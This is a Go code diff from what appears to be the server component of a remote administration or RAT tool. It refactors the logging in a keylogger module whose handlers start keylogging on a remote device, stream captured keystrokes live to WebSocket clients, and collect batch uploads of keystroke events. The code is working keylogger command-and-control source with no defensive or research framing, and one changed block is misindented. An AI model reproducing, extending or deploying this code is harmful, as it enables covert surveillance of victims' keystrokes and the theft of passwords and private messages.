@@ -86,10 +86,9 @@ func startKeylogger(ctx *gin.Context) {
 		config.MaxBuffer = 1000
 	}
 
-	configData, _ := json.Marshal(config)
 	packet := modules.Packet{
 		Act:  "KEYLOGGER_START",
-		Data: configData,
+		Data: config,
 	}
 
 	common.SendPackByUUID(packet, connUUID)
@@ -252,10 +251,10 @@ func liveKeylogger(ctx *gin.Context) {
 	}
 	
 	conn, err := upgrader.Upgrade(ctx.Writer, ctx.Request, nil)
-	if err != nil {
-		utils.Error("Keylogger", "WebSocket upgrade failed: %v", err)
-		return
-	}
+			if err != nil {
+			common.Error("keylogger", "websocket", "upgrade_failed", err.Error(), nil)
+			return
+		}
 	defer conn.Close()
 
 	// Add to live clients for this device
@@ -289,7 +288,7 @@ func HandleKeyloggerEvent(deviceID string, eventType string, data []byte) {
 		// Handle live keystroke event
 		var event KeyEvent
 		if err := json.Unmarshal(data, &event); err != nil {
-			utils.Error("Keylogger", "Failed to unmarshal live event: %v", err)
+			common.Error("keylogger", "unmarshal", "live_event_failed", err.Error(), nil)
 			return
 		}
 		
@@ -309,7 +308,7 @@ func HandleKeyloggerEvent(deviceID string, eventType string, data []byte) {
 			// Send to live clients
 			for _, client := range session.LiveClients {
 				if err := client.WriteJSON(event); err != nil {
-					utils.Error("Keylogger", "Failed to send live event: %v", err)
+					common.Error("keylogger", "websocket", "send_failed", err.Error(), nil)
 				}
 			}
 		}
@@ -318,7 +317,7 @@ func HandleKeyloggerEvent(deviceID string, eventType string, data []byte) {
 		// Handle batch upload of events
 		var events []KeyEvent
 		if err := json.Unmarshal(data, &events); err != nil {
-			utils.Error("Keylogger", "Failed to unmarshal batch events: %v", err)
+			common.Error("keylogger", "unmarshal", "batch_events_failed", err.Error(), nil)
 			return
 		}
 		
@@ -342,15 +341,15 @@ func HandleKeyloggerEvent(deviceID string, eventType string, data []byte) {
 		}
 
 	case "keylogger_started":
-		utils.Info("Keylogger", "Keylogger started on device %s", deviceID)
+		common.Info("keylogger", "status", "started", deviceID, nil)
 
 	case "keylogger_stopped":
-		utils.Info("Keylogger", "Keylogger stopped on device %s", deviceID)
+		common.Info("keylogger", "status", "stopped", deviceID, nil)
 		if session, exists := activeSessions[deviceID]; exists {
 			session.IsActive = false
 		}
 
 	case "keylogger_error":
-		utils.Error("Keylogger", "Keylogger error on device %s: %s", deviceID, string(data))
+		common.Error("keylogger", "device", "error", string(data), map[string]any{"device": deviceID})
 	}
 }
